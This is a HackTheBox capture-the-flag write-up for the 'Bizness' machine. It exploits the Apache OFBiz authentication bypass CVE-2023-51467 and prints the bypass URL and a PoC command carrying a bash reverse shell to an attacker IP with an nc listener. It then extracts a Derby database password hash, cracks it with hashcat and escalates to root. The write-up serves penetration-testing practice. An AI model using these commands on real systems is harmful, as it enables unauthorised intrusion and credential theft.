HTB: Bizness

HackTheBox · Easy · Linux

Difficulty: Easy
CVE-2023-51467 Apache OFBiz RCE Hash Cracking Derby DB
📋 TL;DR: Exploit pre-auth RCE in Apache OFBiz via CVE-2023-51467, get a reverse shell, extract password hash from embedded Derby database, crack it to get root credentials.

Reconnaissance

Start with a full Nmap scan to identify open ports and services:

nmap -sC -sV -oA bizness 10.10.11.252

# Results:
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1
80/tcp  open  http     nginx 1.18.0
443/tcp open  ssl/http nginx 1.18.0
# Port 443 redirects to https://bizness.htb

Add bizness.htb to /etc/hosts and browse to the site. We see an Apache OFBiz instance — an open-source ERP system. 

# Add to /etc/hosts
echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts

# Check OFBiz version
curl -sk https://bizness.htb/accounting/control/main | grep -i version

Finding the Vulnerability

A quick search reveals CVE-2023-51467, a critical authentication bypass in Apache OFBiz versions before 18.12.11. The vulnerability allows unauthenticated access to any endpoint by appending USERNAME&PASSWORD&requirePasswordChange=Y to the URL.

CVE-2023-51467 · CVSS 9.8 Critical
Auth bypass + RCE in Apache OFBiz < 18.12.11

Exploitation

First, confirm the auth bypass works:

# Test auth bypass
curl -sk "https://bizness.htb/accounting/control/main?USERNAME&PASSWORD&requirePasswordChange=Y"
# Should return 200 with admin panel content

# Use PoC exploit for RCE
python3 poc.py --url https://bizness.htb \
  --cmd "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"

Set up the listener and catch the shell:

# Terminal 1: Listener
nc -lvnp 4444

# Terminal 2: Trigger exploit
python3 poc.py --url https://bizness.htb --cmd "..."

# Got a shell!
ofbiz@bizness:/opt/ofbiz$

Privilege Escalation

Enumerate the system for privilege escalation paths. OFBiz uses an embedded Apache Derby database that stores credentials: 

# Find Derby database files
find /opt/ofbiz -name "*.dat" 2>/dev/null

# Extract hashed credentials from Derby DB
grep -r "currentPassword" /opt/ofbiz/runtime/data/derby/ 2>/dev/null | head -5

# Found SHA hash:
# $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN

Crack the hash using hashcat:

# Convert to hashcat format and crack
hashcat -m 120 "d:uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN" /usr/share/wordlists/rockyou.txt

# Cracked: monkeybizness
d:uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN:monkeybizness

# Switch to root
su root  # password: monkeybizness

Root Flag

cat /root/root.txt
c7e2f4a8b3d9c1e0f5a3b7d2e9...

Key Lessons

  • Always check for recent CVEs against identified software versions
  • Embedded databases often store credentials in accessible locations
  • Hash type identification is crucial — use hash-identifier or hashid
  • SHA1 with salt is weak — rockyou.txt cracked it in seconds
